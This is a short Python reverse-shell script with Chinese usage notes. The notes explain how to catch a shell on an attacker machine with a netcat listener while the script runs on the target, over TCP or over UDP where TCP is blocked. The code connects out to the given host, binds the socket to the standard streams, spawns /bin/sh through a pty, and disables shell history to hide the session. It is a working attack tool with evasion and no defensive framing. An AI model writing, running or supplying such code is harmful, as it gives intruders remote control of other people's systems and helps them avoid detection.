# -*- coding:utf-8 -*-
#!/usr/bin/env python

"""
example 1: 反弹shell到我的电脑：192.168.1.100  端口 666
本地监听 ：nc -l -p 666 -vv
目标机器执行：    python back.py 192.168.1.100 666

example 2: 对于封了tcp的机器，可以用udp反弹（udp没有tcp稳定）
本地监听 ：nc -l -p 666 -vv -u
目标机器执行：    python back.py 192.168.1.100 666 udp
"""

import sys,os,socket,pty
shell = "/bin/sh"
def usage(name):
    print('python reverse connector')
    print('usage: %s <ip_addr> <port>' % name)

def main():
    if len(sys.argv) < 3:
        usage(sys.argv[0])
        sys.exit()
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        if sys.argv[3] == 'udp' :
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    except:pass
    try:
        s.connect((sys.argv[1],int(sys.argv[2])))
        print('connect ok')
    except:
        print('connect faild')
        sys.exit()
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    global shell
    os.unsetenv("HISTFILE")
    os.unsetenv("HISTFILESIZE")
    os.unsetenv("HISTSIZE")
    os.unsetenv("HISTORY")
    os.unsetenv("HISTSAVE")
    os.unsetenv("HISTZONE")
    os.unsetenv("HISTLOG")
    os.unsetenv("HISTCMD")
    os.putenv("HISTFILE",'/dev/null')
    os.putenv("HISTSIZE",'0')
    os.putenv("HISTFILESIZE",'0')
    pty.spawn(shell)
    s.close()

if __name__ == '__main__':
    main()
